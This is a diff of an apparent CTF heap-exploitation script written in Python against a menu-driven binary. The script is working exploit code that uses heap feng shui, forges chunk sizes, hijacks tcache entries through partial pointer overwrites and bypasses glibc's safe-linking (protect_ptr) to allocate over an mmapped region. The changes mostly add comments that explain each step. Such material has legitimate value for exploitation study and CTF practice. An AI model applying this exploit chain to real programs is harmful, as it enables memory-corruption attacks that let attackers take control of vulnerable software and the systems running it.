@@ -34,20 +34,21 @@ menu()
 #           Prep allocations        #
 #####################################
 
-# This is the chunk size we will be working with for the unsorted bin hijack
+# This is the chunk size we will be working with to move normal chunks 
+# into the unsorted bin before we move them into the smallbin
 mal_size = 0x88
 
+# create some dangling pointer for later use by using heap fung shui:
 head_chks = []
-head_chks.append(malloc(0x18, b'head'))
-overlap_win = malloc(0x18, 'head')
-head_chks.append(overlap_win)
-overlap_next = malloc(0x18, b'head')
-head_chks.append(overlap_next)
-win_chk_overlap = malloc(0x18, b'head')
-head_chks.append(win_chk_overlap)
-head_chks.append(malloc(mal_size, b'head_last'))
-init_first = malloc(0x108, b'init_first')
-win_chk = malloc(0x18, b'win_chk')
+head_chks.append(malloc(0x18, b'head')) # diff chunk
+
+strong_pointer = malloc(0x18, 'head')  # -\ this chunk is used later -
+head_chks.append(strong_pointer) # -------/ by overwrite its LSB to hijack the tcache structure
+
+head_chks.append(malloc(0x18, b'head')) # -----------\
+head_chks.append(malloc(0x18, b'head')) # ----------- > rest of size needed create 0x110 chunk sized when consolidate
+head_chks.append(malloc(mal_size, b'head_last')) # --/
+
 
 # Make allocations for exhausting t-cache for later
 tcache_0x90 = []
@@ -59,10 +60,6 @@ for i in range(7):
     tcache_0x1b0.append(malloc(0x1a8, b'TCACHE_FUEL'))
 for i in range(7):
     tcache_0x20.append(malloc(0x18, b'TCACHE_FUEL'))
-
-# Set 0x10001 in heap above 0x20 and 0x30 t-cache list
-free(malloc(0x3d8, b'LSB OF FAKE CHUNK SIZE'))
-free(malloc(0x3e8, b'MSB OF FAKE CHUNK SIZE'))
 
 # Prep the allocation for two large unosrted bin entries with the ability
 # to create a UAF
@@ -86,12 +83,13 @@ for i in tcache_0x90:
 for i in tcache_0x20:
     free(i)
 
+# consolidate our head chunks into one large chunk so we could free it into unsortedbin and then into the small bin and hijack the tcache by overwrite its LSB inside the two other chunks in the small bin free list  
 for head in head_chks:
     free(head)
-#first = malloc(0x108, b'first')
-malloc(0x500, b'large')
-first = malloc(0x108, p64(0)*2 + p64(0)+p64(0x341) + p64(0)*2 + p64(0)+p64(0x350))
-#gdb.attach(p)
+malloc(0x500, b'large') 
+
+# overwrite dangling pointers size fields for later use
+head_alloc = malloc(0x108, p64(0)*2 + p64(0)+p64(0x341) + p64(0)*2 + p64(0)+p64(0x350))
 
 #########################################################
 #           Create the UAF setup for later              #
@@ -105,13 +103,11 @@ free(b2)
 free(c2)
 
 
-#gdb.attach(p)
-
 unsorted2 = malloc(0x1a8, b'2'*0x118+p64(0x331))
 unsorted1 = malloc(0x1a8, b'1'*0x118+p64(0x321))
 
-free(c1) # 0x21 t-cache entry
-free(c2) # 0x31 t-cache entry
+free(c1) # 0x321 t-cache entry
+free(c2) # 0x331 t-cache entry
 free(unsorted2)
 free(unsorted1)
 
@@ -150,8 +146,6 @@ malloc(0x58, b'X')
 
 unsorted_f2 = malloc(0x108, b'Z'*mal_size)
 
-unsorted_f3 = malloc(0x108, b'X'*mal_size) # This will be hijacked
-
 #################################################################
 #               Create the two unsorted entries                 #
 #################################################################
@@ -161,78 +155,77 @@ for i in range(8):
 for i in tcache_0x110:
     free(i)
 
-#################################################################################
-#   Make the entry in the mgmt chunk a valid chunk by making the size 0x10000   #
-#   and making a valid size next to it with prev_in_use set to 0                #
-#################################################################################
-
-for i in range(36):
-    malloc(0x5f8, b'Z'*0x5f8)
-malloc(0x5f8, b'A'*0xd0+p64(0x10000)+p64(0x20))
-
 ###############
 # Free chunks #
 ###############
 
 free(unsorted_f1) # Start of unsorted bin
 
-#free(unsorted_f3) # This will be hijacked for later
-free(first)
+free(head_alloc) # This will be hijacked for later
 
 free(unsorted_f2) # End of unsorted bin
-malloc(0x500, b'large')
+
+malloc(0x500, b'large') # sort the chunks free list from unsorted bin into the small bin
 
 
 #############################################################################################
-# Change the FWD and BCK pointers of the unsorted bin entires to our faked chunk in mgmt    #
+# Change the FWD and BCK pointers of the small bin entires to our faked chunk in mgmt       #
 #############################################################################################
 
 malloc(0xd8, p8(0x00), 0xa8) # BCK
 malloc(0xe8, p8(0x00), 0xa0) # FWD 
 
-#free(cons) # free the chunk to be hijacked
+free(strong_pointer) # we will use this pointer to hijack tcache entry
 
-free(overlap_win) # free the chunk to be hijacked
-
-
+### clean the 0x110 tcache bin so we could allocate our fake chunk from the small bin ###
 for _ in range(7):
     malloc(0x108, b'%')
 
+### first allocate the two other chunk we free'd ###
 _ = malloc(0x108, b'&')
 _ = malloc(0x108, b'%')
 
-#gdb.attach(p)
+### allocate our fake chunk, and craft a fake size for later allocations so we could use it again
 tcache_overlap = malloc(0x108, p64(0)+p64(0x201) + p8(0x20))
 
+# Note: prep chunk - the chunk that the prep function allocate and place the mmap pointer inside it
+
+# overwrite head_alloc size field, later we will overwrite its LSB again so we could allocate the prep chunk
 mgmt = malloc(0x330, p64(0)+p64(0x371), 0x70)
 free(mgmt)
 
+###########################
+#   Bypass protect_ptr    #
+###########################
+
+# overwrite prep chunk size field, 
+# now it will place at the bottom of the tcache so we can use the mmaped pointer as its next pointer 
 mgmt = malloc(0x1f8, p64(0)+p64(0x381), 0x90)
 free(mgmt)
 
-free(first)
-
+# free head_alloc again to overwrite its LSB so it now points to the prep chunk
+free(head_alloc)
 mgmt = malloc(0x1f8, p8(0xa0), 0x20)
 
-#gdb.attach(p)
-win = malloc(0x370, b'win')
+# allocate prep chunk, now the mmaped area pointer is on the tcache
+prep_chunk = malloc(0x370, b'prep_chunk') 
 
-tmp = malloc(0x360, 'temp')
+# allocate temp chunk to increase the count field so we could allocate the mmaped chunk
+tmp = malloc(0x360, 'temp') 
 
-free(tmp)
-free(win)
+free(tmp) # increase 0x370 bin count
+free(prep_chunk) # Note: its real userdata size is 0x360 so it will place inside the 0x370 bin
 
 free(mgmt)
 
+# overwrite the LSB of the chunk at the 0x370 bin point to the chunk in the 0x380 bin on the tcache (bypass protect_ptr)
 mgmt = malloc(0x1f8, p8(0x40), 0x18)
 
+# allocate the chunk that point to the 0x380 bin
 garbage = malloc(0x360, b'garbage')
 
-prep = malloc(0x360, p64(0x37C3C7F))
-
-#free(first)
-#gdb.attach(p)
-#p.interactive()
+# finally allocate the mmaped chunk from the 0x370 tcache bin
+mmaped_area = malloc(0x360, p64(0x37C3C7F))
 
 ###############
 # $$$ WIN $$$ #
